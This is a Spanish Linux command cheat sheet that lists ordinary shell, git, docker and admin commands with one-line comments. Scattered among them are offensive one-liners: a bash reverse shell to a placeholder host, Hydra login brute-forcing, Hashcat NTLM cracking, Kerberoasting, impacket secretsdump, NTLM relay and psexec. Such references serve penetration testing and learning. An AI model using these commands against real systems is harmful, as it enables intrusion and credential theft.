#################################################################
#                             LINUX                             #
#################################################################

!!    # Repetir último comando
!$    # Último argumento del comando anterior
!*    # Todos los argumentos del comando anterior
!comando    # Ejecutar último comando que empiece con 'comando'
!n    # Ejecutar comando número n del historial
Alt-#    # Comentar línea actual
apt-mark unhold paquete    # Liberar paquete
ar r libfoo.a archivo.o    # Crear biblioteca estática
ar t libfoo.a    # Listar contenido de biblioteca estática
arp -a    # Mostrar tabla ARP (legacy)
asciiquarium    # Acuario ASCII
atop    # Monitor avanzado de recursos
atq    # Listar trabajos programados con at
atrm ID    # Eliminar trabajo at
atrm n    # Eliminar trabajo programado número n
awk 'END{print NR}' archivo    # Contar líneas totales
awk '{gsub(/foo/, "bar"); print}' archivo    # Reemplazar con awk
aws configure    # Configurar AWS CLI
aws ec2 describe-instances    # Listar instancias EC2
aws s3 ls    # Listar buckets S3
az group list    # Listar grupos de recursos
az login    # Login en Azure
az vm list    # Listar VMs
Ctrl-A    # Ir al inicio de línea
badblocks -sv /dev/sda    # Buscar bloques defectuosos
base64 -d archivo.b64    # Decodificar Base64
base64 archivo    # Codificar a Base64
bash    # Iniciar nuevo bash
bash -c "comando"    # Ejecutar comando en bash
bash -i >& /dev/tcp/host/puerto 0>&1    # Reverse shell bash
bash script.sh    # Ejecutar script en bash
batch    # Ejecutar comando cuando carga baje
bb    # Demostración ASCII art
bc    # Calculadora interactiva
bg    # Reanudar trabajo suspendido en segundo plano
bg %1    # Reanudar trabajo número 1 en segundo plano
binwalk -e archivo    # Extraer contenido
binwalk archivo    # Análisis de firmware/binarios
blkid    # Mostrar UUID de particiones
bloodhound    # Iniciar GUI BloodHound
bloodhound-python -c All -u admin -p pass -d domain -ns host    # Recolección BloodHound
bootchart    # Generar gráfico de arranque
brew doctor    # Diagnosticar problemas
brew info formula    # Información
brew install formula    # Instalar fórmula (macOS/Linux)
brew list    # Listar instalados
brew search palabra    # Buscar
brew services start formula    # Iniciar servicio
brew services stop formula    # Detener servicio
brew tap user/repo    # Añadir tap
brew uninstall formula    # Desinstalar fórmula
brew update    # Actualizar Homebrew
brew upgrade    # Actualizar fórmulas
bunzip2 -c archivo.bz2    # Mostrar contenido de bzip2
bunzip2 archivo.bz2    # Descomprimir bzip2
byobu    # Iniciar Byobu (envoltorio tmux/screen)
byobu new-session -d -n ventana "comando"    # Crear sesión byobu
byobu-disable    # Deshabilitar Byobu
byobu-enable    # Habilitar Byobu por defecto
bzip2 archivo    # Comprimir con bzip2
Alt-B    # Mover palabra hacia atrás
Ctrl-B    # Mover cursor hacia atrás
c++filt _ZN...    # Demangle símbolo C++
cachegrind ./binario    # Perfil de caché
cal    # Mostrar calendario
cal -3    # Mostrar mes anterior, actual y siguiente
cal -y    # Calendario del año
cal 02 2024    # Calendario específico
cargo build    # Compilar proyecto Rust
cargo install paquete    # Instalar paquete Rust
cargo run    # Ejecutar proyecto Rust
cargo test    # Ejecutar tests
cat -n archivo    # Mostrar contenido con números de línea
cat /etc/crontab    # Mostrar tareas cron del sistema
cat /etc/fstab    # Tabla de filesystems
cat /etc/hosts    # Resolución de nombres local
cat /etc/os-release    # Información de distribución (moderno)
cat /etc/resolv.conf    # Configuración DNS
cat /etc/shells    # Listar shells disponibles
cat /proc/cmdline    # Parámetros de arranque
cat /proc/cpuinfo    # Información detallada de CPU
cat /proc/filesystems    # Filesystems soportados
cat /proc/loadavg    # Promedio de carga
cat /proc/meminfo    # Información detallada de memoria
cat /proc/mounts    # Puntos de montaje activos
cat /proc/net/dev    # Estadísticas de interfaces
cat /proc/version    # Versión del kernel
cat > archivo.txt    # Redirigir stdin a archivo (sobrescribir)
cat >> archivo.txt    # Redirigir stdin a archivo (append)
cat archivo    # Mostrar contenido de archivo
cat archivo | fzf    # Seleccionar línea interactivamente
cat archivo | grep patron    # Pipeline clásico (anti-patrón útil)
cat archivo | sort | uniq    # Eliminar todos los duplicados
cat archivo | sort | uniq -c | sort -rn    # Contar frecuencias ordenadas
cat archivo1 archivo2    # Concatenar archivos
cd -    # Ir al directorio anterior
cd ..    # Subir un nivel
cd /    # Ir al directorio raíz
cd dir    # Cambiar a directorio
cd ~    # Ir al directorio home
cewl http://host -w wordlist.txt    # Generar wordlist desde web
cgroups-lite comando    # Ejecutar con control groups (conceptual)
checksec --file=binario    # Verificar seguridad de binario
chgrp group archivo    # Cambiar grupo
chkconfig servicio off    # Deshabilitar servicio (RedHat)
chkconfig servicio on    # Habilitar servicio (RedHat)
chmod +x script.sh    # Hacer ejecutable
chmod -R 755 dir    # Cambiar permisos recursivamente
chmod 755 archivo    # Cambiar permisos en octal
chmod go-w archivo    # Quitar escritura a grupo y otros
chmod u+x archivo    # Añadir permiso de ejecución al usuario
chown -R user dir    # Cambiar propietario recursivamente
chown user archivo    # Cambiar propietario
chown user:group archivo    # Cambiar propietario y grupo
chronyc sources    # Ver fuentes NTP (chrony)
chronyc tracking    # Estado de sincronización
chroot /mnt /bin/bash    # Cambiar root directory
chrpath -r '/lib' binario    # Cambiar rpath
chsh -s /bin/bash    # Cambiar shell por defecto
cksum archivo    # CRC checksum
clear    # Limpiar pantalla
cmake .    # Configurar con CMake
cmatrix    # Efecto Matrix en terminal
cmp archivo1 archivo2    # Comparar archivos byte a byte
column -s',' -t archivo    # Formatear CSV en columnas
column -t archivo    # Formatear en columnas
comando &    # Ejecutar comando en background
comando &> todo.log    # Redirigir stdout y stderr a archivo
comando 2> error.log    # Redirigir stderr a archivo
comando 2>&1 | less    # Redirigir stderr a stdout y paginar
comando < archivo.txt    # Redirigir archivo como stdin
comando <(archivo)    # Process substitution entrada
comando << EOF    # Here-document
comando <<< "texto"    # Here-string
comando > archivo.txt    # Redirigir stdout a archivo (sobrescribir)
comando > archivo.txt 2>&1    # Redirigir stderr a stdout luego a archivo
comando >(archivo)    # Process substitution salida
comando >> archivo.txt    # Redirigir stdout a archivo (append)
comando1 $(comando2)    # Anidar sustitución de comando
comando1 & comando2    # Ejecutar 1 en background, luego 2
comando1 && comando2    # Ejecutar 2 si 1 tuvo éxito
comando1 ; comando2    # Ejecutar 1 y luego 2
comando1 | comando2    # Pipe: salida de 1 a entrada de 2
comando1 |& comando2    # Pipe con stderr incluido (bash)
comando1 || comando2    # Ejecutar 2 si 1 falló
comm -12 archivo1 archivo2    # Líneas comunes a ambos
comm archivo1 archivo2    # Comparar archivos ordenados línea a línea
compgen -c    # Listar todos los comandos disponibles
compgen -f    # Listar archivos para completación
complete -p    # Mostrar completaciones definidas
convert entrada.jpg -resize 50% salida.jpg    # Redimensionar
convert entrada.jpg salida.png    # Convertir imagen (ImageMagick)
cowsay "hola"    # Vaca diciendo hola
cp -a origen destino    # Copiar preservando atributos
cp -i origen destino    # Copiar con confirmación
cp -r origen destino    # Copiar recursivamente
cp -v origen destino    # Copiar verboso
cp origen destino    # Copiar archivo
cpio -idv < archivo.cpio    # Extraer cpio
cppcheck --enable=all src    # Análisis estático C++
crackmapexec smb host -u admin -p pass    # Enumerar SMB
crontab -e    # Editar tareas cron del usuario
crontab -l    # Listar tareas cron del usuario
crontab -l | grep backup    # Buscar en crontab
crontab -r    # Eliminar tareas cron del usuario
crontab archivo    # Instalar archivo como crontab
crunch 8 12 abc123 -o wordlist.txt    # Generar wordlist
cryptsetup close secure    # Cerrar volumen LUKS
cryptsetup luksFormat /dev/sdb    # Formatear con LUKS
cryptsetup open /dev/sdb secure    # Abrir volumen LUKS
csh    # Iniciar csh
csplit archivo '/regex/'    # Dividir archivo por patrón
csplit archivo 10 20    # Dividir en líneas 10 y 20
cupp -i    # Generar wordlist personalizada
curl --insecure url    # Ignorar verificación SSL
curl -H 'Header: valor' url    # Enviar header personalizado
curl -I url    # Mostrar solo headers
curl -k url    # Ignorar verificación SSL
curl -L url    # Seguir redirecciones
curl -o archivo url    # Descargar archivo con nombre específico
curl -O url    # Descargar archivo conservando nombre
curl -u user:pass url    # Autenticación básica
curl -v url    # Modo verbose
curl -X POST -d 'datos' url    # Enviar POST
curl url    # Descargar contenido de URL
cut --complement -f1 archivo    # Extraer todo excepto campo 1
cut -c1-10 archivo    # Extraer caracteres 1-10
cut -d':' -f1 archivo    # Extraer primera columna
cut -f1,3 archivo    # Extraer campos 1 y 3
Alt-C    # Cambiar directorio con fzf
Ctrl-C    # Enviar SIGINT al proceso en primer plano
dash script.sh    # Ejecutar en dash (sh ligero)
date    # Mostrar fecha y hora
date +"%Y-%m-%d"    # Mostrar fecha en formato personalizado
date +%s    # Timestamp Unix
date --date="next monday"    # Fecha relativa
date -d "yesterday"    # Mostrar fecha de ayer
date -d @1700000000    # Convertir timestamp
date -u    # Fecha UTC
dc    # Calculadora de notación polaca inversa
dd if=/dev/sda of=backup.img bs=4M    # Clonar disco
dd if=/dev/urandom of=archivo bs=1K count=1    # Datos aleatorios
dd if=/dev/zero of=archivo bs=1M count=100    # Crear archivo de 100MB
dd if=origen of=destino bs=1M    # Copiar bloques
deactivate    # Desactivar entorno virtual
df    # Mostrar uso de disco
df -h    # Mostrar uso de disco en formato humano
df -hT    # Mostrar filesystems y tipos
df -i    # Mostrar inodos libres
df -T    # Mostrar tipo de filesystem
diff -r dir1 dir2    # Comparar directorios recursivamente
diff -u archivo1 archivo2    # Diferencias en formato unificado
diff -y archivo1 archivo2    # Diferencias lado a lado
diff archivo1 archivo2    # Diferencias entre archivos
dig +short dominio    # Consulta DNS corta
dig -x IP    # Consulta DNS inversa
dig dominio    # Consultar DNS
dig dominio MX    # Consultar registros MX
dig dominio NS    # Consultar registros NS
dirb http://host    # Fuerza bruta de directorios
dirs    # Mostrar pila de directorios
disown    # Desvincular último trabajo del shell
disown -a    # Desvincular todos los trabajos
dmesg    # Mostrar mensajes del kernel
dmesg -T    # Mostrar mensajes con timestamps humanos
dmesg | tail    # Mostrar últimos mensajes del kernel
dmidecode    # Volcar tabla DMI
dmidecode -t memory    # Información de memoria
dmidecode -t processor    # Información de procesador
dnf autoremove    # Eliminar huérfanos
dnf clean all    # Limpiar caché
dnf info paquete    # Información
dnf install paquete    # Instalar paquete (Fedora)
dnf list installed    # Listar instalados
dnf remove paquete    # Eliminar paquete
dnf repolist    # Listar repos
dnf search palabra    # Buscar
dnf update    # Actualizar
dnf upgrade    # Actualizar todo
docker attach contenedor    # Adjuntar a contenedor en ejecución
docker build -t nombre .    # Construir imagen desde Dockerfile
docker context ls    # Listar contexts
docker context use contexto    # Cambiar contexto
docker cp . contenedor:/ruta    # Copiar hacia contenedor
docker cp contenedor:/ruta .    # Copiar desde contenedor
docker diff contenedor    # Ver cambios en filesystem
docker exec -it contenedor bash    # Ejecutar shell en contenedor
docker exec contenedor comando    # Ejecutar comando en contenedor
docker export -o cont.tar contenedor    # Exportar filesystem
docker history imagen    # Historial de capas
docker images    # Listar imágenes
docker images -q    # Listar solo IDs de imágenes
docker import cont.tar    # Importar como imagen
docker info    # Información del daemon
docker inspect --format='{{.NetworkSettings.IPAddress}}' contenedor    # Campo específico
docker inspect contenedor    # Información JSON del contenedor
docker kill contenedor    # Forzar detención
docker load -i imagen.tar    # Cargar imagen desde tar
docker login    # Iniciar sesión en registry
docker logout    # Cerrar sesión
docker logs --tail 100 contenedor    # Últimas 100 líneas
docker logs -f contenedor    # Seguir logs
docker logs contenedor    # Ver logs
docker network inspect red    # Inspeccionar red
docker network ls    # Listar redes
docker pause contenedor    # Pausar contenedor
docker port contenedor    # Ver mapeo de puertos
docker ps    # Listar contenedores activos
docker ps -a    # Listar todos los contenedores
docker ps -q    # Listar solo IDs
docker pull imagen    # Descargar imagen
docker push repo/imagen    # Subir imagen
docker restart contenedor    # Reiniciar contenedor
docker rm $(docker ps -aq)    # Eliminar todos los contenedores
docker rm contenedor    # Eliminar contenedor
docker rmi $(docker images -q)    # Eliminar todas las imágenes
docker rmi imagen    # Eliminar imagen
docker run --name miapp imagen    # Nombrar contenedor
docker run --rm imagen    # Eliminar al terminar
docker run -d imagen    # Ejecutar en background
docker run -it imagen bash    # Ejecutar interactivo con shell
docker run -p 8080:80 imagen    # Mapear puerto
docker run -v /host:/contenedor imagen    # Montar volumen
docker run imagen    # Ejecutar contenedor
docker save -o imagen.tar imagen    # Guardar imagen a tar
docker search imagen    # Buscar en Docker Hub
docker start contenedor    # Iniciar contenedor
docker stats    # Estadísticas de recursos
docker stop contenedor    # Detener contenedor
docker system df    # Uso de disco
docker system prune    # Limpiar recursos no usados
docker tag origen destino    # Etiquetar imagen
docker top contenedor    # Procesos del contenedor
docker unpause contenedor    # Reanudar contenedor
docker update --cpus=2 contenedor    # Actualizar recursos
docker version    # Versión
docker volume create nombre    # Crear volumen
docker volume ls    # Listar volúmenes
docker volume rm nombre    # Eliminar volumen
docker wait contenedor    # Esperar a que termine
docker-compose build    # Construir servicios
docker-compose config    # Validar y mostrar configuración
docker-compose down    # Detener y eliminar
docker-compose exec servicio comando    # Ejecutar en servicio
docker-compose logs    # Ver logs
docker-compose ps    # Listar servicios
docker-compose pull    # Descargar imágenes
docker-compose restart    # Reiniciar servicios
docker-compose up    # Levantar servicios
docker-compose up -d    # Levantar en background
dpkg -i paquete.deb    # Instalar paquete .deb
dpkg -l    # Listar paquetes instalados
dpkg -L paquete    # Listar archivos de paquete
dpkg -r paquete    # Eliminar paquete
dpkg -S archivo    # Buscar paquete que contiene archivo
dpkg-reconfigure paquete    # Reconfigurar paquete
du    # Mostrar uso de disco de archivos
du -ah dir    # Mostrar todo con tamaños humanos
du -h    # Mostrar uso en formato humano
du -sh dir    # Mostrar total de directorio
dumpe2fs /dev/sda1    # Volcar información de ext4
Alt-D    # Borrar palabra hacia adelante
Ctrl-D    # Enviar EOF (cerrar stdin)
e2fsck -f /dev/sda1    # Forzar verificación
e2fsck /dev/sda1    # Verificar filesystem ext4
echo "1+1" | bc    # Calcular en pipeline
echo "scale=2; 10/3" | bc    # División con decimales
echo "texto"    # Imprimir texto
echo $HOME    # Mostrar HOME
echo $PATH    # Mostrar PATH
echo $USER    # Mostrar USER
echo $VAR    # Imprimir variable
echo -e "linea1\nlinea2"    # Interpretar escapes
echo -n "texto"    # Sin salto de línea
egrep patron archivo    # Equivalente a grep -E
emacs -nw archivo    # Emacs en terminal
emacs archivo    # Editar con Emacs
enum4linux -a host    # Enumeración SMB completa
env    # Mostrar variables de entorno
env python3 script.py    # Ejecutar con intérprete específico
env VAR=valor comando    # Ejecutar con variable temporal
espeak "Hola"    # Síntesis de voz
ethtool -s eth0 speed 1000 duplex full    # Configurar interfaz
ethtool eth0    # Mostrar estadísticas de interfaz
exec comando    # Reemplazar shell con comando
exiftool archivo    # Metadatos
exit    # Salir del shell
expand -t 4 archivo    # Expandir tabs a 4 espacios
export TERM=xterm    # Configurar TERM
export VAR=valor    # Exportar variable
expr 1 + 1    # Evaluar expresión
expr 10 \* 5    # Multiplicar (escapar asterisco)
Ctrl-E    # Ir al fin de línea
factor 100    # Factorizar número
faillog    # Registro de logins fallidos
fdisk -l    # Listar particiones
fdisk /dev/sda    # Editar tabla de particiones (MBR)
festival --tts < archivo    # Leer archivo en voz alta
ffmpeg -i entrada -ss 00:01:00 -t 10 -c copy recorte.mp4    # Cortar video
ffmpeg -i entrada -vf "scale=640:-1" salida.mp4    # Redimensionar
ffmpeg -i entrada salida.mp4    # Convertir video/audio
ffmpeg -i video.mp4 -vcodec copy -an video_sin_audio.mp4    # Eliminar audio
ffmpeg -i video.mp4 -vn -acodec copy audio.aac    # Extraer audio
ffplay archivo.mp4    # Reproducir video con FFmpeg
ffuf -u http://host/FUZZ -w wordlist.txt    # FFUF fuzzing
fg    # Traer último trabajo a primer plano
fg %1    # Traer trabajo número 1 a primer plano
fgrep patron archivo    # Equivalente a grep -F (fijo)
figlet TEXTO    # Arte ASCII de texto
file -i archivo    # Identificar tipo MIME
file binario    # Identificar tipo de archivo
find . -exec comando {} \;    # Ejecutar comando en cada resultado
find . -maxdepth N    # Limitar profundidad de búsqueda
find . -name '*.log' -mtime +7    # Buscar archivos modificados hace más de 7 días
find . -name '*.old' -delete    # Buscar y eliminar directamente
find . -name '*.py' | xargs rm    # Buscar y eliminar archivos .py
find . -name '*.txt'    # Buscar archivos por nombre
find . -perm 644    # Buscar archivos con permisos específicos
find . -size +100M    # Buscar archivos mayores a 100MB
find . -type d    # Buscar solo directorios
find . -type f    # Buscar solo archivos
find . -type f | fzf    # Seleccionar archivo
findmnt    # Mostrar árbol de montajes
finger user    # Mostrar información de usuario
firewall-cmd --add-service=ssh --permanent    # Permitir servicio
firewall-cmd --list-all    # Listar reglas de firewalld
firewall-cmd --reload    # Recargar firewalld
fish    # Iniciar fish
flatpak install app    # Instalar flatpak
flatpak list    # Listar flatpaks
flatpak uninstall app    # Eliminar flatpak
flatpak update    # Actualizar flatpaks
fmt -w 80 archivo    # Formatear a ancho de 80
fold -w 80 archivo    # Cortar líneas a 80 caracteres
fortune    # Mostrar cita aleatoria
free    # Mostrar uso de memoria
free -h    # Mostrar uso de memoria en formato humano
free -m    # Mostrar uso de memoria en megabytes
fsck /dev/sda1    # Verificar filesystem genérico
fuser -k 80/tcp    # Matar procesos en puerto 80
fuser -km /mnt    # Matar procesos usando punto de montaje
fuser -v archivo    # Procesos usando archivo
fzf    # Fuzzy finder interactivo
Alt-F    # Mover palabra hacia adelante
Ctrl-F    # Mover cursor hacia adelante
gawk '/pattern/ {print}' archivo    # Filtrar por patrón
gawk 'BEGIN {print "Inicio"}' archivo    # Bloque BEGIN
gawk 'NR==10' archivo    # Imprimir línea 10
gawk 'NR>10 && NR<20' archivo    # Líneas 11-19
gawk '{print $1, $3}' archivo    # Imprimir columnas 1 y 3
gawk '{print $1}' archivo    # Imprimir primera columna
gawk '{print $NF}' archivo    # Imprimir última columna
gawk '{print length}' archivo    # Longitud de cada línea
gawk '{sum+=$1} END {print sum}' archivo    # Sumar columna
gawk -F':' '{print $1}' archivo    # Usar separador :
gawk -v var=valor '{print var}' archivo    # Pasar variable
gcloud auth login    # Login en GCP
gcloud compute instances list    # Listar instancias
gcloud config set project ID    # Establecer proyecto
gdb -batch -ex "bt" -p PID    # Obtener backtrace automáticamente
gdb -p PID    # Adjuntar GDB a proceso
gdb ./programa    # Depurar con GDB
gdisk /dev/sda    # Editar tabla de particiones (GPT)
gem install paquete    # Instalar gema Ruby
gem list    # Listar
gem uninstall paquete    # Desinstalar
getent group group    # Información de grupo NSS
getent hosts host    # Información de host NSS
getent passwd user    # Información de usuario NSS
GetNPUsers.py domain/ -usersfile users.txt -dc-ip host    # AS-REP Roasting
GetUserSPNs.py domain/admin:pass -dc-ip host    # Kerberoasting
git add -p    # Añadir interactivamente por parches
git add .    # Añadir todos los cambios
git add archivo    # Añadir archivo al staging
git archive --format=tar HEAD > repo.tar    # Exportar como tar
git bisect bad    # Marcar commit como malo
git bisect good commit    # Marcar commit como bueno
git bisect start    # Iniciar búsqueda binaria
git blame -L 10,20 archivo    # Ver autor de líneas 10-20
git blame archivo    # Ver autor de cada línea
git branch    # Listar ramas
git branch -d nombre    # Eliminar rama
git branch -m nuevo_nombre    # Renombrar rama
git branch nombre    # Crear rama
git bundle create repo.bundle --all    # Crear bundle
git bundle unbundle repo.bundle    # Desempaquetar bundle
git checkout -- archivo    # Descartar cambios en archivo
git checkout -b nombre    # Crear y cambiar a rama
git checkout commit -- archivo    # Restaurar archivo de commit
git checkout nombre    # Cambiar de rama
git cherry-pick commit    # Aplicar commit específico
git clean -fd    # Eliminar archivos no rastreados
git clone url    # Clonar repositorio
git commit -a -m "mensaje"    # Confirmar todos los cambios modificados
git commit -m "mensaje"    # Confirmar cambios
git config --global alias.co checkout    # Crear alias
git config --global core.editor vim    # Configurar editor
git config --global user.email "email"    # Configurar email
git config --global user.name "Nombre"    # Configurar nombre
git config --list    # Listar configuración
git describe --tags    # Describir commit con tag más cercano
git diff    # Ver cambios no confirmados
git diff --cached    # Ver cambios en staging
git diff HEAD~1    # Ver cambios respecto a commit anterior
git fetch    # Descargar cambios del remoto
git fetch --all    # Descargar de todos los remotos
git fetch --tags    # Descargar tags
git fsck    # Verificar integridad
git gc    # Recolector de basura
git grep patron    # Buscar en el repositorio
git init    # Inicializar repositorio
git instaweb --start    # Iniciar servidor web visualizador
git log    # Ver historial
git log --author="nombre"    # Filtrar por autor
git log --graph --oneline --all    # Historial gráfico de todas las ramas
git log --oneline    # Historial resumido
git log --since="1 week ago"    # Filtrar por fecha
git log --stat    # Ver estadísticas por commit
git log -p -2    # Ver patch de últimos 2 commits
git merge --abort    # Abortar fusión
git merge nombre    # Fusionar rama
git pull    # Descargar e integrar cambios
git pull --rebase    # Descargar y rebasesar
git push    # Subir cambios
git push --tags    # Subir tags
git push -u origin rama    # Subir y establecer upstream
git push origin --delete rama    # Eliminar rama remota
git rebase -i HEAD~3    # Rebase interactivo
git rebase nombre    # Rebasear rama
git reflog    # Ver historial de referencias
git remote -v    # Ver repositorios remotos
git remote add origin url    # Añadir remoto
git remote remove origin    # Eliminar remoto
git remote rename old new    # Renombrar remoto
git reset --hard HEAD~1    # Deshacer último commit y cambios
git reset --soft HEAD~1    # Deshacer último commit manteniendo cambios
git reset HEAD archivo    # Quitar archivo del staging
git restore archivo    # Restaurar archivo a estado del índice (moderno)
git revert commit    # Crear commit que revierte otro
git show --stat commit    # Ver estadísticas de commit
git show commit    # Ver detalle de commit
git stash    # Guardar cambios temporalmente
git stash apply    # Aplicar stash sin eliminar
git stash drop    # Eliminar último stash
git stash list    # Listar stashes
git stash pop    # Restaurar último stash
git status    # Ver estado del repositorio
git submodule update --init    # Inicializar submódulos
git submodule update --recursive    # Actualizar recursivamente
git switch rama    # Cambiar a rama (moderno, seguro)
git tag -a nombre -m "msg"    # Crear tag anotado
git tag -d nombre    # Eliminar tag
git tag nombre    # Crear tag
git update-server-info    # Actualizar info para servidor dumb
git worktree add ../rama-nueva rama    # Crear worktree
gobuster dir -u http://host -w wordlist.txt    # Gobuster directorios
gobuster dns -d dominio -w wordlist.txt    # Fuerza bruta DNS
gpg --batch --passphrase pass --symmetric archivo    # Encriptar sin interacción
gpg --decrypt archivo.gpg    # Desencriptar
gpg --encrypt -r ID archivo    # Encriptar para destinatario
gpg --export -a ID > pub.asc    # Exportar clave pública ASCII
gpg --gen-key    # Generar par de claves
gpg --import pub.asc    # Importar clave pública
gpg --list-keys    # Listar claves públicas
gpg --list-secret-keys    # Listar claves privadas
gpg --sign archivo    # Firmar archivo
gpg --verify archivo.sig archivo    # Verificar firma
gpg -c archivo    # Encriptar archivo simétricamente
gpg -d backup.tar.gz.gpg | tar xzvf -    # Desencriptar y extraer
gpg archivo.gpg    # Desencriptar archivo
gpg2john privada.asc > hash.txt    # Preparar clave GPG para John
grep --color=auto patron archivo    # Resaltar coincidencias en color
grep -c patron archivo    # Contar coincidencias
grep -E 'patron1|patron2' archivo    # Expresiones regulares extendidas
grep -H patron archivo    # Mostrar nombre de archivo en resultados
grep -i patron archivo    # Buscar ignorando mayúsculas
grep -l patron dir/*    # Mostrar solo nombres de archivo con coincidencias
grep -n patron archivo    # Mostrar números de línea
grep -o patron archivo    # Extraer solo la coincidencia (only-matching)
grep -r patron dir    # Buscar recursivamente
grep -v patron archivo    # Invertir coincidencias
grep -w patron archivo    # Buscar palabra completa
grep patron archivo    # Buscar patrón en archivo
groupadd group    # Crear grupo
groupdel group    # Eliminar grupo
groups    # Mostrar grupos del usuario
groups user    # Mostrar grupos de otro usuario
grub-mkconfig -o /boot/grub/grub.cfg    # Generar configuración GRUB
gunzip archivo.gz    # Descomprimir archivo
gvim archivo    # Vim gráfico
gzip -9 archivo    # Máxima compresión
gzip -d archivo.gz    # Descomprimir
gzip archivo    # Comprimir archivo
Ctrl-G    # Cancelar búsqueda en historial
halt    # Detener CPU
hash    # Mostrar comandos hasheados
hash -r    # Limpiar hash de comandos
hashcat --example-hashes    # Ver ejemplos de hashes
hashcat -m 0 hash.txt pass.txt    # Crack con Hashcat
hashcat -m 1000 hash.txt pass.txt    # NTLM crack
hdparm -I /dev/sda    # Información de disco
hdparm -tT /dev/sda    # Test de velocidad de disco
head -n 20 archivo    # Mostrar primeras 20 líneas
head archivo    # Mostrar primeras 10 líneas
helm delete nombre    # Eliminar release
helm install nombre chart    # Instalar chart
helm list    # Listar releases
helm upgrade nombre chart    # Actualizar release
hexdump -C archivo    # Volcar en hexadecimal y ASCII
history    # Mostrar historial de comandos
history -c    # Limpiar historial
host dominio    # Consultar DNS simple
hostname    # Mostrar nombre del host
hostname -I    # Mostrar direcciones IP
hostnamectl    # Mostrar/establecer información del host
htop    # Monitor de procesos mejorado
hwclock    # Reloj de hardware
hwclock --hctosys    # Sincronizar hardware a sistema
hwclock --systohc    # Sincronizar sistema a hardware
hydra -l admin -P pass.txt host http-post-form "/login:username=^USER^&password=^PASS^:Invalid"    # Fuerza bruta HTTP
hydra -l admin -P pass.txt ssh://host    # Fuerza bruta SSH
id    # Mostrar ID de usuario y grupo
id -g    # GID numérico
id -Gn    # Nombres de grupos
id -u    # UID numérico
id user    # Mostrar ID de otro usuario
identify imagen.jpg    # Información de imagen
ifconfig    # Mostrar interfaces (legacy)
ifconfig eth0    # Mostrar interfaz específica (legacy)
ifconfig eth0 192.168.1.1    # Asignar IP (legacy)
ifconfig eth0 up    # Levantar interfaz (legacy)
impacket-ntlmrelayx -tf targets.txt    # NTLM Relay
impacket-psexec admin:pass@host    # Ejecutar remoto PSEXEC
impacket-secretsdump domain/admin@host    # Extraer secrets Windows
